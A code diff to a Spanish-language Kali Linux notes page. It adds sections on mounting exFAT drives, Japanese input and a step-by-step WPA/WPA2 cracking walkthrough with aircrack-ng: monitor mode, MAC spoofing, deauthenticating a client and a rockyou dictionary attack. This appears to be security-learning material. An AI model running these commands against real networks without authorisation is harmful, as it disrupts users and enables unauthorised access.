@@ -53,7 +53,7 @@
 							$ cryptsetup luksClose /dev/mapper/my_usb<br>
 							</p>
 						</blockquote>
-						<p style="text-align:justify;">Documentación original: <a href="https://www.kali.org/docs/usb/usb-persistence-encryption/" lang="en" translate="no">USB Persistence & Encrypted Persistence</a></p>
+						<p style="text-align:justify;">Documentación original: <a href="https://www.kali.org/docs/usb/usb-persistence-encryption/" lang="en" translate="no" target="_blank">USB Persistence & Encrypted Persistence</a></p>
 						<hr />
 					</details>
 					</section>
@@ -76,10 +76,141 @@
 							$ sudo modprobe 88x2bu<br>
 							</p>
 						</blockquote>
-						<p style="text-align:justify;">Documentación original: <a href="https://github.com/cilynx/rtl88x2bu" lang="en" translate="no">Driver for rtl88x2bu wifi adaptors</a></p>
+						<p style="text-align:justify;">Documentación original: <a href="https://github.com/cilynx/rtl88x2bu" lang="en" translate="no" target="_blank">Driver for rtl88x2bu wifi adaptors</a></p>
 						<hr />
 					</details>
 					</section>
+
+					<section>
+						<details>
+						<summary>
+							<header>
+								<h3>Montar USB exfat en Kali Linux</h3>
+							</header>
+						</summary>
+							<p style="text-align:justify;">
+							Supongamos que disponemos de un pendrive formateado con exfat (propietario) en "sdb1".
+							</p>
+							<blockquote>
+								<p lang="en" translate="no">
+								$ sudo apt install exfat-fuse exfat-utils<br>
+								</p>
+							</blockquote>
+							<p style="text-align:justify;">
+								Esto no es suficiente, ya que al intentar montarlo nos da un error de permisos. La solución es montar a mano:
+							</p>
+							<blockquote>
+								<p lang="en" translate="no">
+								$ sudo mkdir /media/kali/Flash<br>
+								$ sudo mount.exfat-fuse /dev/sdb1 /media/kali/Flash<br>
+								</p>
+							</blockquote>
+	
+							<p style="text-align:justify;">Documentación original: <a href="https://unix.stackexchange.com/questions/607949/cannot-mount-exfat-even-installed-exfat-fuse-exfat-utils-in-kali-linux" lang="en" translate="no" target="_blank">Cannot mount exFAT even installed exfat-fuse, exfat-utils in kali linux</a></p>
+							<hr />
+						</details>
+						</section>	
+
+						<section>
+							<details>
+							<summary>
+								<header>
+									<h3>Escribir con Kanji en Kali Linux</h3>
+								</header>
+							</summary>
+								<blockquote lang="en" translate="no">
+									<p>
+									$ sudo apt install ibus-mozc anthy<br>
+									$ ibus-setup<br>
+									</p>
+								</blockquote>
+								<p style="text-align:justify;">
+									Es necesario reiniciar, y tendremos en la barra un panel de idioma
+								</p>
+								<p style="text-align:justify;">Documentación original: <a href="https://forums.kali.org/showthread.php?35622-Kali-Linux-Help-Me-Enable-Japanese-IME-with-Mozc-or-Anthy" lang="en" translate="no" target="_blank">Kali Linux - Help Me Enable Japanese IME with Mozc or Anthy </a></p>
+								<hr />
+							</details>
+							</section>
+
+					<section>
+					<details>
+					<summary>
+						<header>
+							<h3>Buscar redes y obtener el PMKID con AirCrack-NG</h3>
+						</header>
+					</summary>
+						<p style="text-align:justify;">
+							El primer paso es poner la tarjeta <i>Wifi</i> en modo monitor, y aconsejable cambiarle la <i>MAC</i>. Este proceso desconectará nuestra <i>Wifi</i> del <i>AP</i> donde esté conectada.
+						</p>
+						<blockquote lang="en" translate="no">
+							<p>
+							$ sudo airmon-ng <br>
+							$ sudo ifconfig wlan1 down<br>
+							$ sudo macchanger -r wlan1<br>
+							$ sudo ifconfig wlan1 up<br>
+							$ sudo airmon-ng stop wlan1<br>
+							$ sudo airmon-ng check kill<br>
+							$ sudo airmon-ng start wlan1<br>
+							$ sudo iwconfig<br>
+							</p>
+						</blockquote>
+						<p style="text-align:justify;">
+							Una vez la tenemos en modo <i>monitor</i>, buscamos el <i>AP</i> de la red que nos interesa. Nos interesa el <i>BSSID</i> y el canal.
+						</p>
+						<blockquote lang="en" translate="no">
+							<p>
+							$ sudo airodump-ng wlan1<br>
+							</p>
+						</blockquote>
+						<p style="text-align:justify;">
+							Primero intentamos obtener el <i>PMKID</i> en modo pasivo. Tendremos que esperar hasta que un dispositivo de la <i>Wifi</i> objetivo se conecte o renueve su conexión.
+							En el ejemplo, el <i>BSSID</i> de la red es <i>XX:XX:XX:XX:XX:XX</i>, el canal es el <i>00</i> y generamos un archivo <i>pcapfile.cap</i>.
+						</p>
+						<blockquote lang="en" translate="no">
+							<p>
+							$ sudo airodump-ng -c 00 --bssid XX:XX:XX:XX:XX:XX -w pcapfile wlan1 <br>
+							</p>
+						</blockquote>
+						<p style="text-align:justify;">
+							Si no queremos esperar, podemos forzar la captura inyectando paquetes y desconectando un cliente de la red. 
+							Para ello, hemos de abrir otra terminal mientras mantenemos la anterior escuchando y ha de haberse visualizado un cliente conectado a la red <i>Wifi</i> objetivo.
+							En el ejemplo, la <i>MAC</i> del dispositivo cliente es <i>YY:YY:YY:YY:YY:YY</i>.
+						</p>
+						<blockquote lang="en" translate="no">
+							<p>
+							$ sudo aireplay-ng -0 1 -a XX:XX:XX:XX:XX:XX -c YY:YY:YY:YY:YY:YY wlan1 <br>
+							</p>
+						</blockquote>
+						<p style="text-align:justify;">
+							Cuando <i>aircrack-ng</i> haya obtenido el paquete <i>PMKID</i> lo marcará en la columna <i>Notes</i>. 
+							Una vez conseguido, ya podemos cerrar <i>^C</i> la ventana de <i>airodump-ng</i> y recuperar nuestra <i>Wifi</i>.
+						</p>
+						<blockquote lang="en" translate="no">
+							<p>
+							$ sudo airmon-ng stop wlan1<br>
+							$ sudo systemctl start NetworkManager<br>
+							</p>
+						</blockquote>
+						<p style="text-align:justify;">
+							Por último, solo falta obtener la contraseña. Esto lo podemos hacer usando <i>aircrack-ng</i> u otro <i>software</i>, como por ejemplo <i>hascat</i> (en este caso, habría que transformar el archivo <i>pcap</i> generado a <i>hccapx</i> usando <i>cap2hccapx</i>)
+							Lo mas normal es probar un ataque de diccionario, antes de realizar uno de fuerza bruta.
+							En el ejemplo, usamos el diccionario <i>rockyou</i>, disponible por defecto en <i>Kali Linux</i> en <i>/usr/share/wordlists</i>, solo hay que descomprimirlo.
+						</p>
+						<blockquote lang="en" translate="no">
+							<p>
+							$ sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b XX:XX:XX:XX:XX:XX pcapfile*.cap<br>
+							</p>
+						</blockquote>
+						<p style="text-align:justify;">Documentación original:<br> 
+						<a href="https://linuxhint.com/how_to_aircrack_ng/" lang="en" translate="no" target="_blank">How to Use Aircrack-ng</a><br>
+						<a href="https://byte-mind.net/cracking-de-wpa-wpa2-con-aircrack-ng/" lang="en" translate="no" target="_blank">Cracking de WPA/WPA2 con aircrack-ng</a><br>
+						<a href="https://www.aircrack-ng.org/doku.php?id=simple_wep_crack" lang="en" translate="no" target="_blank">Tutorial: Simple WEP Crack</a><br>
+						<a href="https://medium.com/@brannondorsey/crack-wpa-wpa2-wi-fi-routers-with-aircrack-ng-and-hashcat-a5a5d3ffea46" lang="en" translate="no" target="_blank">Crack WPA/WPA2 Wi-Fi Routers with Aircrack-ng and Hashcat</a><br>
+						</p>
+						<hr />
+					</details>
+					</section>
+
 				</div>
 
 				<footer class="major container medium">
